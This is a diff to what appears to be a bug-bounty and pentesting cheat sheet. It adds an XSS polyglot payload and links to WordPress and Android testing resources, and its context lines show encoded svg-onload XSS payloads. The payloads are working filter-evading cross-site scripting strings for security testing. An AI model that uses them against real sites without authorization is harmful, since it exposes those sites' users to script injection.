@@ -20,6 +20,11 @@ Dec: <svg onload=prompt%26%230000000040document.domain)>
 Hex: <svg onload=prompt%26%23x000000028;document.domain)>
 ```
 
+### XSS Polyglot
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
 ### Pentesting Wordpress
 ```
 https://hackingarticles.in/wordpress-pentest-lab-setup-in-multiple-ways/
@@ -135,4 +140,14 @@ ${web:rootDir}
 
 ```
 https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
+```
+
+### Bug Bounty with Android Mobile
+```
+https://twitter.com/rootxyash/status/1482968235138228228
+```
+
+### Wordpress Common Vulnerabilities
+```
+https://twitter.com/rootxyash/status/1478313618730983424
 ```
